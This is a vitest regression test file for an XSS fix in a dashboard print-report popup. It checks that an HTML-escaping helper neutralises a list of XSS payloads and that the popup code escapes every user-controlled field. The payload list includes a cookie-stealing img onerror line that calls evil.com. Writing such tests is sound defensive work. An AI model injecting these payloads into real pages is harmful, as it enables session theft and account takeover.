import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { escapeHtml } from "@/lib/html-escape";

/**
 * XSS regression tests for the dashboard print-report popup.
 *
 * Background: The print popup builds an HTML document via template literals
 * and writes it with `document.write`. Because the popup is same-origin, an
 * unescaped `guest_name` (or any other user-controlled field) would execute
 * JavaScript in the dashboard's security context — full account takeover.
 *
 * These tests guard the two halves of the fix:
 *   1) `escapeHtml` neutralises every payload we care about.
 *   2) `ReportsPanel.handlePrint` actually pipes every user-controlled field
 *      through `escapeHtml` (verified by source inspection so the assertion
 *      survives even if the popup-rendering code path changes).
 */
describe("escapeHtml — XSS payloads", () => {
  const payloads: Array<{ name: string; input: string; mustNotContain: RegExp }> = [
    {
      name: "raw <script> tag",
      input: "<script>alert(1)</script>",
      mustNotContain: /<script/i,
    },
    {
      name: "<img onerror=...> exfil",
      input: "<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>",
      mustNotContain: /<img/i,
    },
    {
      name: "<svg onload=...>",
      input: "<svg onload=alert(1)>",
      mustNotContain: /<svg/i,
    },
    {
      name: "attribute-break via double quote",
      input: '" onclick="alert(1)" x="',
      mustNotContain: /"\s+onclick=/i,
    },
    {
      name: "attribute-break via single quote",
      input: "' onclick='alert(1)' x='",
      mustNotContain: /'\s+onclick=/i,
    },
    {
      name: "iframe javascript: src",
      input: '<iframe src="javascript:alert(1)"></iframe>',
      mustNotContain: /<iframe/i,
    },
    {
      name: "ampersand entity injection",
      input: "&lt;script&gt;",
      mustNotContain: /^&lt;/, // raw & must be re-encoded to &amp;
    },
  ];

  it.each(payloads)("neutralises $name", ({ input, mustNotContain }) => {
    const out = escapeHtml(input);
    expect(out).not.toMatch(mustNotContain);
    // None of the five dangerous characters survive unescaped:
    expect(out).not.toMatch(/[<>"']/);
    // Ampersands are always encoded as entities, never bare:
    expect(out).not.toMatch(/&(?!(amp|lt|gt|quot|#39);)/);
  });

  it("preserves null/undefined as empty string", () => {
    expect(escapeHtml(null)).toBe("");
    expect(escapeHtml(undefined)).toBe("");
  });

  it("preserves benign text unchanged", () => {
    expect(escapeHtml("Anna Andersson")).toBe("Anna Andersson");
    expect(escapeHtml("Table 12 - 4 guests")).toBe("Table 12 - 4 guests");
  });

  it("is idempotent on already-escaped output (double-encodes &, by design)", () => {
    // Double-encoding is the safe behaviour: it guarantees no decode-once
    // sink can produce active markup. We assert it explicitly so a future
    // change to "skip if looks-like-entity" would fail this test on purpose.
    expect(escapeHtml(escapeHtml("<b>x</b>"))).toBe("&amp;lt;b&amp;gt;x&amp;lt;/b&amp;gt;");
  });
});

describe("ReportsPanel.handlePrint — source-level escaping guard", () => {
  const source = readFileSync(
    resolve(__dirname, "ReportsPanel.tsx"),
    "utf8",
  );

  // Extract just the handlePrint function body so we don't get false positives
  // from other parts of the file.
  const handlePrintMatch = source.match(/const handlePrint = \(\) => \{[\s\S]*?\n {2}\};/);

  it("contains a handlePrint definition", () => {
    expect(handlePrintMatch).not.toBeNull();
  });

  const body = handlePrintMatch?.[0] ?? "";

  it("imports the shared escapeHtml helper", () => {
    expect(source).toMatch(/from\s+["']@\/lib\/html-escape["']/);
    expect(body).toMatch(/const esc = escapeHtml/);
  });

  /**
   * Every user-controlled reservation field that gets interpolated into the
   * popup HTML must go through `esc(...)`. If you add a new field, add it
   * here too — that is the whole point of this regression test.
   */
  const userControlledFields = [
    "r.guest_name",
    "r.reservation_type",
    "r.status",
    "effectiveSiteName",
    "periodLabel",
  ];

  it.each(userControlledFields)(
    "wraps interpolations of `%s` in esc(...)",
    (field) => {
      // Find every `${...field...}` interpolation in the body.
      const interpolationRe = new RegExp(
        "\\$\\{[^}]*" + field.replace(/\./g, "\\.") + "[^}]*\\}",
        "g",
      );
      const interpolations = body.match(interpolationRe) ?? [];
      expect(
        interpolations.length,
        `expected at least one interpolation of \`${field}\` in handlePrint`,
      ).toBeGreaterThan(0);
      for (const expr of interpolations) {
        expect(
          expr,
          `unescaped interpolation of \`${field}\` in handlePrint: ${expr}`,
        ).toMatch(/esc\(/);
      }
    },
  );

  it("does not contain a raw `${r.guest_name}` interpolation", () => {
    // Belt-and-braces: the most dangerous historical vector.
    expect(body).not.toMatch(/\$\{r\.guest_name\}/);
  });

  it("does not reintroduce a local non-escaping `esc` helper", () => {
    // Prevent a refactor from shadowing the import with a no-op helper.
    expect(body).not.toMatch(/const esc = \(.*\) => String\(/);
  });
});
